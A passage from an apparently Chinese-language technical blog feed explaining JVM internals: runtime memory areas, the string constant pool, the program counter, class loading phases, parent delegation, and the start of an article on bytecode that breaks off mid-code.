Linking）</h4><p>指向运行时常量池的方法引用</p><ul><li>每一个栈帧内部包含一个指向运行时常量池中该栈帧所属方法的引用，包含这个引用的目的就是为了支持当前方法的代码能够实现动态链接</li><li>在 Java 源文件被编译到字节码文件中时，所有的变量和方法引用都作为符号引用（Symbolic Reference）保存在 class 文件的常量池里。比如：描述一个方法调用了另外的其他方法时，就是通过常量池中指向方法的符号引用来表示的，那么<strong>动态链接的作用就是为了将这些符号引用转换为调用方法的直接引用</strong>。</li></ul><h3 id="相关问题"><a href="#相关问题" class="headerlink" title="相关问题"></a>相关问题</h3><p>栈 jdk5以后默认都是1M，栈空间比较小</p><h4 id="栈中存在垃圾回收吗？"><a href="#栈中存在垃圾回收吗？" class="headerlink" title="栈中存在垃圾回收吗？"></a>栈中存在垃圾回收吗？</h4><p>栈中不存在垃圾回收</p><h4 id="栈中可能抛出的异常是什么？"><a href="#栈中可能抛出的异常是什么？" class="headerlink" title="栈中可能抛出的异常是什么？"></a>栈中可能抛出的异常是什么？</h4><blockquote><p>Java 虚拟机规范允许Java栈的大小是动态的或者是固定不变的。</p></blockquote><ul><li><p>如果采用固定大小的Java虚拟机栈，那每一个线程的Java虚拟机栈容量可以在线程创建的时候独立选定。如果线程请求分配的栈容量超过Java虚拟机栈允许的最大容量，Java虚拟机将会抛出一个StackOverflowError 异常。</p></li><li><p>如果Java虚拟机栈可以动态扩展，并且在尝试扩展的时候无法申请到足够的内存，或者在创建新的线程时没有足够的内存去创建对应的虚拟机栈，那Java虚拟机将会抛出一个 OutOfMemoryError 异常。</p></li></ul><h4 id="如何设置栈内存的大小？"><a href="#如何设置栈内存的大小？" class="headerlink" title="如何设置栈内存的大小？"></a>如何设置栈内存的大小？</h4><p>-Xss size (即：-XX:ThreadStackSize) 一般默认为512k-1024k，取决于操作系统。</p><h2 id="三、本地方法栈"><a href="#三、本地方法栈" class="headerlink" title="三、本地方法栈"></a>三、本地方法栈</h2><blockquote><p><strong>本地方法栈</strong>和<strong>虚拟机栈</strong>相似，区别就是虚拟机栈为虚拟机执行<code>Java</code>服务（字节码服务）<strong>，而本地方法栈为虚拟机使用到的</strong><code>Native</code>方法（比如C++方法）服务**。</p></blockquote><p>简单地讲，一个Native Method就是一个Java调用非Java代码的接口。或者更为底层的接口</p><h3 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h3><p>调用native方法直接与操作系统与硬件打交道。多线程底层就是这么实现的</p><h2 id="四、-方法区"><a href="#四、-方法区" class="headerlink" title="四、 方法区"></a>四、 方法区</h2><blockquote><p>方法区（Method Area）是可供各个线程共享的运行时内存区域</p></blockquote><p>方法区本质上是Java语言<strong>编译后代码存储区域</strong>，它存储每一个类的结构信息，例如：<strong>运行时常量池</strong>、成员变量、方法数据、构造方法和普通方法的字节码指令等内容。很多语言都有类似区域。</p><h2 id="五、-字符串常量池"><a href="#五、-字符串常量池" class="headerlink" title="五、 字符串常量池"></a>五、 字符串常量池</h2><p><strong>class常量池：一个class文件只有一个class常量池</strong></p><ul><li><p>字面量：数值型（int、float、long、double）、双引号引起来的字符串值等</p></li><li><p>符号引用：Class、Method、Field等</p></li></ul><p><strong>运行时常量池：一个class对象有一个运行时常量池</strong></p><ul><li><p>字面量：数值型（int、float、long、double）、双引号引起来的字符串值等</p></li><li><p>符号引用：Class、Method、Field等</p></li></ul><p><strong>字符串常量池：全局只有一个字符串常量池</strong></p><ul><li>双引号引起来的字符串值</li></ul><h3 id="字符串常量池存储"><a href="#字符串常量池存储" class="headerlink" title="字符串常量池存储"></a>字符串常量池存储</h3><p>为了提高匹配速度， 即更快的查找某个字符串是否存在于常量池 Java 在设计字符串常量池的时候，还搞了一张StringTable， StringTable里面保存了<strong>字符串的引用</strong>。StringTable类似于HashTable（哈希表）。在JDK1.7+，StringTable可以通过参数指定 -XX:StringTableSize&#x3D;5555</p><h3 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h3><blockquote><p>对象使用双引号字符串赋值和使用new String等的区别</p></blockquote><ul><li><p>单独使用””引号创建的字符串都是常量，编译期就已经确定存储到String Pool中。</p></li><li><p>使用new String(“”)创建的对象会存储到heap中，是运行期新创建的。</p></li><li><p>使用只包含常量的字符串连接符如”aa”+”bb”创建的也是常量，编译期就能确定已经存储到StringPool中。</p></li><li><p>使用包含变量的字符串连接如”aa”+s创建的对象是运行期才创建的，存储到heap中。</p></li><li><p>运行期调用String的intern()方法可以向String Pool中动态添加对象</p></li></ul><h2 id="六、程序计数器（Program-Counter-Register）"><a href="#六、程序计数器（Program-Counter-Register）" class="headerlink" title="六、程序计数器（Program Counter Register）"></a>六、程序计数器（Program Counter Register）</h2><blockquote><p>PC 寄存器用来存储指向下一条指令的地址，也即将要执行的指令代码</p></blockquote><ul><li><p>它是一块很小的内存空间，几乎可以忽略不记。也是运算速度最快的存储区域。</p></li><li><p>在 JVM 规范中，每个线程都有它自己的程序计数器，是线程私有的，生命周期与线程的生命周期保持一致。</p></li><li><p>任何时间一个线程都只有一个方法在执行，也就是所谓的<strong>当前方法</strong>。程序计数器会存储当前线程正在执行的 Java 方法的 JVM 指令地址；或者，如果是在执行 native方法，则是未指定值（undefined）（因为PC寄存器是java层面的，本地方法栈是C&#x2F;C++层面的）。</p></li><li><p>它是程序控制流的指示器，分支、循环、跳转、异常处理、线程恢复等基础功能都需要依赖这个计数器来完成；</p></li><li><p>字节码解释器工作时就是通过改变这个计数器的值来选取下一条需要执行的字节码指令；</p></li><li><p>它是唯一一个在 Java 虚拟机规范中没有规定任何 OutOfMemoryError 情况的区域。</p></li></ul><h3 id="为什么要设置成-线程私有的-？"><a href="#为什么要设置成-线程私有的-？" class="headerlink" title="为什么要设置成 线程私有的 ？"></a>为什么要设置成 线程私有的 ？</h3><p>CPU需要不停的切换线程，在切换回来的时候，A线程的PC寄存器里就记录了 A线程执行到哪里了 B线程的PC寄存器里就记录了 B线程执行到哪里了，所以需要 是线程私有的。</p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>JVM</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JVM与GC调优(二)-类加载子系统篇</title>
    <link href="/posts/a82b0894.html"/>
    <url>/posts/a82b0894.html</url>
    
    <content type="html"><![CDATA[<p>类的加载过程解析与双亲委派机制与破坏双亲委派机制相关</p><span id="more"></span><h2 id="类加载作用"><a href="#类加载作用" class="headerlink" title="类加载作用"></a>类加载作用</h2><p><strong>ClassLoader</strong></p><p><code>ClassLoader</code>是Java的核心组件，所有的Class都是由ClassLoader进行加载的</p><p><code>ClassLoader</code>负责通过各种方式将Class信息的二进制数据流读入JVM内部，转换为一个与目标类对应的java.lang.Class对象实例，然后交给Java虚拟机进行链接、初始化等操作</p><p><code>ClassLoader</code>在整个装载阶段，只能影响到类的<code>加载</code>（<code>Loading阶段</code>），而无法通过ClassLoader去改变类的<code>链接和初始化</code>行为。至于它是否可以运行，则由Execution Engine决定。</p><h2 id="类加载的时机"><a href="#类加载的时机" class="headerlink" title="类加载的时机"></a>类加载的时机</h2><ul><li>遇到 <code>new</code> 、 <code>getstatic</code> 、 <code>putstatic</code> 和 <code>invokestatic</code> 这四条指令时，如果对应的类没有初始化，则要对对应的类先进行初始化</li><li>使用 java.lang.reflect 包方法时，对类进行<strong>反射调用</strong>的时候</li><li>初始化一个类的时候发现其<strong>父类</strong>还没初始化，要先初始化其<strong>父类</strong></li><li>当虚拟机开始启动时，用户需要指定一个主类（main），虚拟机会先执行这个主类的初始化。</li></ul><h2 id="类加载的顺序"><a href="#类加载的顺序" class="headerlink" title="类加载的顺序"></a>类加载的顺序</h2><p><strong>检查顺序是自底向上</strong>：加载过程中会先检查类是否被已加载，从Custom ClassLoader到BootStrap</p><p>ClassLoader逐层检查，只要某个classloader已加载就视为已加载此类，保证此类只所有</p><p>ClassLoader加载一次。</p><p><strong>加载的顺序是自顶向下</strong>：也就是由上层来逐层尝试加载此类。</p><h2 id="类的加载过程"><a href="#类的加载过程" class="headerlink" title="类的加载过程"></a>类的加载过程</h2><blockquote><p>类加载主要过程分为 加载、链接、初始化三个阶段，而链接阶段又分为验证 准备 解析</p></blockquote><p><img src="http://hyqup-blog-upyun.test.upcdn.net/img/image-20220921210744405.png" alt="image-20220921210744405"></p><p> ClassLoader只负责class文件的加载，至于它是否可以运行，则由Execution Engine决定。</p><p> <a href="https://www.cnblogs.com/aaabbbcccddd/p/14539063.html">JVM内存模型——堆(heap)、栈(stack)和方法区(method)</a></p><h3 id="过程一：Loading（加载）阶段"><a href="#过程一：Loading（加载）阶段" class="headerlink" title="过程一：Loading（加载）阶段"></a>过程一：Loading（加载）阶段</h3><blockquote><p>将Java类的字节码文件加载到机器内存中，并在内存中构建出java类的原型实例（类模板对象），类结构信息存储到<code>方法区</code></p></blockquote><p><code>类模板对象</code>：本质就是java类在JVM内存中的一个快照，JVM将从字节码文件中解析出的常量池、类字段、类方法等信息存储到类模板中，在JVM运行的时候，就可以通过类模板获取Java类的所有信息，能够对Java类的成员变量进行遍历，也能进行Java 方法的调用</p><p>反射的原理也就JVM在运行期间去拿到类模板信息</p><h3 id="过程二：Linking（链接）阶段"><a href="#过程二：Linking（链接）阶段" class="headerlink" title="过程二：Linking（链接）阶段"></a>过程二：Linking（链接）阶段</h3><h4 id="小节一：链接阶段值Verification-验证"><a href="#小节一：链接阶段值Verification-验证" class="headerlink" title="小节一：链接阶段值Verification(验证)"></a>小节一：链接阶段值Verification(验证)</h4><blockquote><p>目的是<strong>保证加载的字节码是合法、合理并符合规范的</strong></p></blockquote><p>验证的内容则涵盖了类数据信息的<strong>格式验证、语义检查、字节码验证，以及符号引用验证</strong>等</p><h4 id="小节二：链接阶段值Preparation-准备"><a href="#小节二：链接阶段值Preparation-准备" class="headerlink" title="小节二：链接阶段值Preparation(准备)"></a>小节二：链接阶段值Preparation(准备)</h4><blockquote><p><strong>为类的静态变量分配内存，并将其初始化为默认值</strong></p></blockquote><table><thead><tr><th>类型</th><th>默认初始值</th></tr></thead><tbody><tr><td>byte</td><td>(byte)0</td></tr><tr><td>short</td><td>(short)0</td></tr><tr><td>int</td><td>0</td></tr><tr><td>long</td><td>OL</td></tr><tr><td>float</td><td>0.0f</td></tr><tr><td>double</td><td>0.0</td></tr><tr><td>char</td><td>\u0000</td></tr><tr><td>boolean</td><td>false</td></tr><tr><td>reference</td><td>null</td></tr></tbody></table><h4 id="小节三：链接阶段值Resolution-解析"><a href="#小节三：链接阶段值Resolution-解析" class="headerlink" title="小节三：链接阶段值Resolution(解析)"></a>小节三：链接阶段值Resolution(解析)</h4><blockquote><p><strong>解析阶段（Resolution），简言之，将类、接口、字段和方法的符号引用转为直接引用。</strong></p></blockquote><p>符号引用就是一些字面量的引用，和虚拟机的内部数据结构和和内存布局无关。比较容易理解的就是<strong>在Class类文件中，通过常量池进行了大量的符号引用</strong>。但是在程序实际运行时，只有符号引用是不够的，比如当println()方法被调用时，系统需要明确知道该方法的位置。</p><h3 id="过程三：Initialization（初始化）阶段"><a href="#过程三：Initialization（初始化）阶段" class="headerlink" title="过程三：Initialization（初始化）阶段"></a>过程三：Initialization（初始化）阶段</h3><blockquote><p><em><strong>初始化阶段，简言之，为类的静态变量赋予正确的初始值。</strong></em></p></blockquote><p>1、具体描述</p><p>类的初始化是类装载的最后一个阶段。如果前面的步骤都没有问题，那么表示类可以顺利装载到系统中。此时，类才会开始执行Java字节码。<strong>（即：到了初始化阶段，才真正开始执行类中定义的Java程序代码。）</strong></p><p>初始化阶段的重要工作是执行类的初始化方法：<code>&lt;clinit&gt;()方法</code></p><p>该方法仅能由<code>Java编译器生成</code>并由<code>JVM调用</code>，程序开发者无法自定义一个同名的方法，更无法直接在Java程序中调用该方法，虽然该方法也是由字节码指令所组成。<br>它是由类静态成员的赋值语句以及static语句块合并产生的。 </p><p>clinit编译生成：</p><p>​<strong>静态的变量赋值编译才会生成clint方法</strong></p><p>案例说明：</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">int</span> a<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">//不会，不是静态，链接(Linking)的准备阶段赋值</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> a<span class="token punctuation">;</span> <span class="token comment">//不会，没有赋值</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> a<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//final 修饰后不是变量是常量所以也不会</span><span class="token keyword">public</span> <span class="token keyword">static</span>  <span class="token keyword">int</span> a<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// 此时会，静态变量初始化赋值</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h4 id="static-final-修饰的一定不会在初始化赋值吗？"><a href="#static-final-修饰的一定不会在初始化赋值吗？" class="headerlink" title="static final 修饰的一定不会在初始化赋值吗？"></a>static final 修饰的一定不会在初始化赋值吗？</h4><p>eg: public static final Integter INTEGTER_CONSTANT&#x3D;Integer.valueOf(1000);</p><p>因为这里不是常量而是一个方法调用，所以此时也会生成clint</p><h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p>使用 static+final修饰的成员变量，称为：<code>全局常量</code></p><p>什么时候在<code>链接</code>的准备阶段赋值：给该全局常量赋的值是<code>字面量</code>或者<code>常量</code>，不涉及到<code>方法的调用</code>，其余场景在初始化阶段赋值</p><h3 id="类的初始化情况：主动使用-vs被动使用"><a href="#类的初始化情况：主动使用-vs被动使用" class="headerlink" title="类的初始化情况：主动使用 vs被动使用"></a>类的初始化情况：主动使用 vs被动使用</h3><blockquote><p>Java程序对类的使用分为两种：<strong>主动使用和被动使用</strong>。</p></blockquote><h4 id="主动使用"><a href="#主动使用" class="headerlink" title="主动使用"></a>主动使用</h4><p>Class只有在必须要首次使用的时候才会被装载，Java虚拟机不会无条件地装载Class类型。Java虚拟机规定，<strong>一个类或接口在初次使用前，必须要进行初始化</strong>。这里指的“使用”，是指<code>主动使用</code>，主动使用只有下列几种情况：（即：如果出现如下的情况，则会对类进行初始化操作。而初始化操作之前的加载、验证、准备已经完成）</p><p>1.当创建一个类的实例时，比如使用new关键字，或者通过反射、克隆、反序列化；</p><p>2.当调用类的静态方法时，即当使用了字节码invokestatic指令；</p><p>3.当使用类、接口的静态字段时（final修饰特殊考虑），比如，使用getstatic或者putstatic指令。（对应访问变量、赋值变量操作）；</p><p>4.当使用java.lang.reflect包中的方法反射类的方法时。比如:Class.forName；</p><p>5.当初始化子类时，如果发现其父类还没有进行过初始化，则需要先触发其父类的初始化；</p><p>6.如果一个接口定义了default方法，那么直接实现或者间接实现该接口的类的初始化，该接口要在其之前被初始化；</p><p>7.当虚拟机启动时，用户需要指定一个要执行的主类（包含main()方法的那个类），虚拟机会先初始化这个主类；</p><p>8.当初次调用 MethodHandle实例时，初始化该MethodHandle指向的方法所在的类。（涉及解析REF_getStatic、REF_putStatic、REF_invokeStatic方法句柄对应的类）；</p><h4 id="被动使用"><a href="#被动使用" class="headerlink" title="被动使用"></a>被动使用</h4><p>除了以上的情况属于主动使用，其他的情况均属于被动使用。<strong>被动使用不会引起类的初始化。</strong></p><ol><li>当访问一个静态字段时，只有真正声明这个字段的类才会被初始化；<br>当通过子类引用父类的静态变量，不会导致子类初始化；</li><li>通过数组定义类引用，不会触发此类的初始化；</li><li>引用常量不会触发此类或接口的初始化。因为常量在链接阶段就已经被显式赋值了；</li><li>调用ClassLoader类的loadClass()方法加载一个类，并不是对类的主动使用，不会导致类的初始化；</li></ol><h2 id="类的加载器分类"><a href="#类的加载器分类" class="headerlink" title="类的加载器分类"></a>类的加载器分类</h2><h3 id="显示加载与隐士加载"><a href="#显示加载与隐士加载" class="headerlink" title="显示加载与隐士加载"></a>显示加载与隐士加载</h3><ul><li><strong>显示加载</strong>：指的是在代码中通过调用ClassLoader加载class对象，如直接使用Class.forName（name）或this.getClass().getClassLoader().loadClass()加载class对象</li><li><strong>隐式加载</strong>：不直接在代码中调用ClassLoader的方法加载class对象，而是通过虚拟机自动加载到内存中，如在加载某个类的class文件时，该类的class文件中引用了另外一个类的对象，此时额外引用的类将通过JVM自动加载到内存中。</li></ul><h3 id="类加载机制的基本特征"><a href="#类加载机制的基本特征" class="headerlink" title="类加载机制的基本特征"></a>类加载机制的基本特征</h3><ul><li><strong>双亲委派模型</strong>：</li><li><strong>可见性</strong>：子类加载器可以访问父加载器加载的类型，但是反过来是不允许的。</li><li><strong>单一性</strong>：父加载器中加载过的类型，就不会在子加载器中重复加载。但是注意，类加载器“邻居”间，同一类型仍然可以被加载多次，因为互相并不可见。</li></ul><h3 id="类加载器分类（两大类）"><a href="#类加载器分类（两大类）" class="headerlink" title="类加载器分类（两大类）"></a>类加载器分类（两大类）</h3><blockquote><p><strong>引导类加载器(Bootstrap ClassLoader)<strong>和</strong>自定义类加载器(User-Defined ClassLoader)</strong></p></blockquote><p><img src="http://file.hyqup.cn/img/%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%A7%8D%E7%B1%BB.png" alt="类加载器种类"></p><blockquote><p>父子加载类实际上不存在继承关系，而是一种组合关系</p></blockquote><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">ClassLoader</span> <span class="token punctuation">&#123;</span><span class="token class-name">ClassLoader</span> parent<span class="token punctuation">;</span>       父类加载器<span class="token keyword">public</span> <span class="token class-name">ClassLoader</span><span class="token punctuation">(</span><span class="token class-name">ClassLoader</span> parent<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>parent <span class="token operator">=</span> parent<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">ParentClassLoader</span> <span class="token keyword">extends</span> <span class="token class-name">ClassLoader</span> <span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token class-name">ParentClassLoader</span><span class="token punctuation">(</span><span class="token class-name">ClassLoader</span> parent<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">super</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">ChildClassLoader</span> <span class="token keyword">extends</span> <span class="token class-name">ClassLoader</span> <span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token class-name">ChildClassLoader</span><span class="token punctuation">(</span><span class="token class-name">ClassLoader</span> parent<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//parent = new ParentClassLoader();</span><span class="token keyword">super</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="ClassLoader加载逻辑"><a href="#ClassLoader加载逻辑" class="headerlink" title="ClassLoader加载逻辑"></a>ClassLoader加载逻辑</h3><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> <span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">boolean</span> resolve<span class="token punctuation">)</span>     <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">synchronized</span> <span class="token punctuation">(</span><span class="token function">getClassLoadingLock</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token comment">// First, check if the class has already been loaded</span>         <span class="token comment">// 查找一下这个类是不是已经加载过了</span>         <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> c <span class="token operator">=</span> <span class="token function">findLoadedClass</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">//如果没有加载过</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token keyword">long</span> t0 <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">nanoTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                 <span class="token comment">//parent  每个类加载器都有个父加载器,判断是否有父类加载器，存在则调用父类加载器去加载。双亲委派模型在这</span>                 <span class="token keyword">if</span> <span class="token punctuation">(</span>parent <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                     c <span class="token operator">=</span> parent<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                     <span class="token comment">//如果父类加载器为空，就说明到达顶层也就是BootstrapClassLoader,BootstrapClassLoader属于C/C++编写这里拿不到对象的</span>                     c <span class="token operator">=</span> <span class="token function">findBootstrapClassOrNull</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token punctuation">&#125;</span>             <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                 <span class="token comment">// ClassNotFoundException thrown if class not found</span>                 <span class="token comment">// from the non-null parent class loader</span>             <span class="token punctuation">&#125;</span><span class="token comment">//如果父类加载都没有加载，则使用当前类加载</span>             <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                 <span class="token comment">// If still not found, then invoke findClass in order</span>                 <span class="token comment">// to find the class.</span>                 <span class="token keyword">long</span> t1 <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">nanoTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment">// findClass用于加载</span>                 c <span class="token operator">=</span> <span class="token function">findClass</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment">// this is the defining class loader; record the stats</span>                 <span class="token class-name"><span class="token namespace">sun<span class="token punctuation">.</span>misc<span class="token punctuation">.</span></span>PerfCounter</span><span class="token punctuation">.</span><span class="token function">getParentDelegationTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addTime</span><span class="token punctuation">(</span>t1 <span class="token operator">-</span> t0<span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token class-name"><span class="token namespace">sun<span class="token punctuation">.</span>misc<span class="token punctuation">.</span></span>PerfCounter</span><span class="token punctuation">.</span><span class="token function">getFindClassTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addElapsedTimeFrom</span><span class="token punctuation">(</span>t1<span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token class-name"><span class="token namespace">sun<span class="token punctuation">.</span>misc<span class="token punctuation">.</span></span>PerfCounter</span><span class="token punctuation">.</span><span class="token function">getFindClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">increment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">&#125;</span>         <span class="token punctuation">&#125;</span>         <span class="token comment">// 是否需要解析，默认都是false</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>resolve<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token function">resolveClass</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>         <span class="token keyword">return</span> c<span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="双亲委派模型"><a href="#双亲委派模型" class="headerlink" title="双亲委派模型"></a>双亲委派模型</h3><blockquote><p>如果一个类加载器在接到加载类的请求时，它<strong>首先不会自己尝试去加载这个类</strong>，而是把<strong>这个请求任务委托给父类加载器去完成，依次递归，</strong>如果父类加载器可以完成类加载任务，就成功返回。<strong>只有父类加载器无法完成此加载任务时，才自己去加载</strong></p></blockquote><p><img src="http://hyqup-blog-upyun.test.upcdn.net/img/20210601230727770.png" alt="双亲委派模型"></p><h4 id="双亲委派模型优势"><a href="#双亲委派模型优势" class="headerlink" title="双亲委派模型优势"></a>双亲委派模型优势</h4><ul><li><p>双亲委派保证类加载器，自下而上的委派，又自上而下的加载，<strong>避免类的重复加载</strong>，确保一个类的全局唯一性。保证每一个类在各个类加载器中都是同一个类。</p><p>简言之：当父亲已经加载了该类时，就没有必要子类的ClassLoader 再加载一次</p></li><li><p>保护程序安全，防止核心API被接口重写</p></li></ul><h4 id="为什么需要打破双亲委派"><a href="#为什么需要打破双亲委派" class="headerlink" title="为什么需要打破双亲委派"></a>为什么需要打破双亲委派</h4><p>父类加载器加载范围受限，无法加载的类需要委托子类加载器去完成加载</p><p>直观：JDK的基础类做为典型的API需要去<strong>调用用户代码</strong>，如SPI机制，这种情况就需要打破双亲委派</p><h4 id="如何破坏双亲委派"><a href="#如何破坏双亲委派" class="headerlink" title="如何破坏双亲委派"></a>如何破坏双亲委派</h4><ol><li>方式一：<strong>重写</strong> <strong>loadClass</strong> 方法来<strong>实现用户自定义类加载器</strong></li><li>方式二：<code>SPI</code>，父类委托自类加载器加载Class，以数据库驱动DriverManager为例</li><li>方式三：热部署和不停机更新用到的OSGI技术</li></ol><h3 id="自定义类加载器"><a href="#自定义类加载器" class="headerlink" title="自定义类加载器"></a>自定义类加载器</h3><blockquote><p>自定义Class类继承ClassLoader重写findClass方法</p></blockquote><h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><ul><li>新建一个Test.java</li><li>编译Test.java到指定目录</li><li>自定义MyClassLoader继承ClassLoader<ul><li>重写findClass</li><li>调用defineClass</li></ul></li><li>测试自定义</li></ul>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>JVM</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JVM与GC调优(一)-字节码篇</title>
    <link href="/posts/d7ec6c3.html"/>
    <url>/posts/d7ec6c3.html</url>
    
    <content type="html"><![CDATA[<p>了解JVM整体架构图，javac编译器编译步骤，class文件的解读，字节码指令是什么以及常见的字节码有哪些</p><span id="more"></span><p><strong>概念</strong>：广义上的JVM是指一种规范，狭义上的JVM指的是Hotspot类的虚拟机实现</p><p><strong>Java语言与JVM的关系</strong>：Java语言编写程序生成class字节码在JVM虚拟机里执行。其他语言也可以，比如 kotlin、Groovy</p><p><strong>学习流程</strong>：类加载子系统 –&gt; 运行时数据区 –&gt; 一个对象的一生–&gt; GC垃圾收集器</p><h2 id="知识体系"><a href="#知识体系" class="headerlink" title="知识体系"></a>知识体系</h2><blockquote><p>JVM整体学习流程</p></blockquote><ul><li><strong>字节码引出JVM基础知识</strong></li><li><strong>类的加载过程</strong></li><li><strong>运行时内存数据</strong></li><li><strong>对象内存布局</strong></li><li><strong>执行引擎</strong></li><li><strong>垃圾回收</strong></li><li><strong>JVM性能监控</strong></li><li><strong>性能调优案例</strong></li></ul><h2 id="字节码篇"><a href="#字节码篇" class="headerlink" title="字节码篇"></a>字节码篇</h2><blockquote><p>什么是字节码指令？</p></blockquote><p>Java虚拟机的指令是由<code>一个字节长度</code>的、代表着某种特定操作含义的<code>操作码</code>（opcode），以及其后跟随<code>零至多个</code>代表此操作所需参数的<code>操作数</code>（operand）</p><h3 id="字节码案例"><a href="#字节码案例" class="headerlink" title="字节码案例"></a>字节码案例</h3><h4 id="案例1"><a href="#案例1" class="headerlink" title="案例1"></a>案例1</h4><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ByteCondeInterview</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/**     * 包装类对象的缓存问题     * Byte         -128-127     * Short        -128-127     * Integer      -128-127     * Long         -128-127     * Float        没有     * Double       没有     * Character    0-127     * Boolean      true/false     */</span>    <span class="token annotation punctuation">@Test</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test1</span><span class="token punctuation">(</span><span class="token 